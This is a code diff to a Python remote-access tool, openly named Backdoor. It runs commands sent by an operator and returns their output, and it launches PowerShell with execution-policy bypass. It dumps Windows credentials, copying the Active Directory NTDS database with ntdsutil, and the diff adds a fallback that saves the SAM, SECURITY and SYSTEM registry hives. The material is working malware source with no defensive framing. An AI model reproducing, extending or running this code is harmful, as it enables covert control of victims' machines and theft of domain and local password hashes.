@@ -207,7 +207,7 @@ class Backdoor:
             try:
                 cmd = 'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe -ep bypass ' + str(cmd)
                 DEVNULL = open(os.devnull, 'wb')
-                return subprocess.check_output(cmd,shell=True, stderr=DEVNULL, stdin=DEVNULL)
+                return subprocess.call(cmd,shell=True, stderr=DEVNULL, stdin=DEVNULL)
             except:
                 return "[-] powershell returned error code 1 [-]"
         else:
@@ -219,9 +219,15 @@ class Backdoor:
                 shutil.rmtree("C:\Windows\Temp\copy-ntds")
                 subprocess.call('ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\copy-ntds" quit quit',shell=True)
 
-                return "[+] ntds dumped in c:\Windows\Temp\copy-ntds [+]"
+                return "[+] dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds [+]"
             except:
-                return "[-] ntds dump failed [-]"
+                try:
+                    subprocess.call('reg save hklm\sam c:\sam.save',shell=True)
+                    subprocess.call('reg save hklm\security c:\security.save',shell=True)
+                    subprocess.call('reg save hklm\system c:\system.save',shell=True)
+                    return "[+] dumped using reg save, saved in c:\\sam.save, system.save , security.save [+]"
+                except:
+                    return "[-] ntds dump failed [-]"
         else:
             return "[!] target is not a windows machine [!]"
 
@@ -390,7 +396,10 @@ class Backdoor:
             elif len(cmd) > 0:
                 try:
                     cmd = ' '.join(cmd[0:])
-                    result = str(subprocess.check_output(cmd + "; exit 0" , shell=True,stderr=subprocess.STDOUT))
+                    if os_type == "linux":
+                        result = str(subprocess.check_output(cmd + "; exit 0" , shell=True,stderr=subprocess.STDOUT))
+                    else:
+                        result = str(subprocess.check_output(cmd , shell=True,stderr=subprocess.STDOUT))
                 except:
                     result = " "
             self.json_send(result)
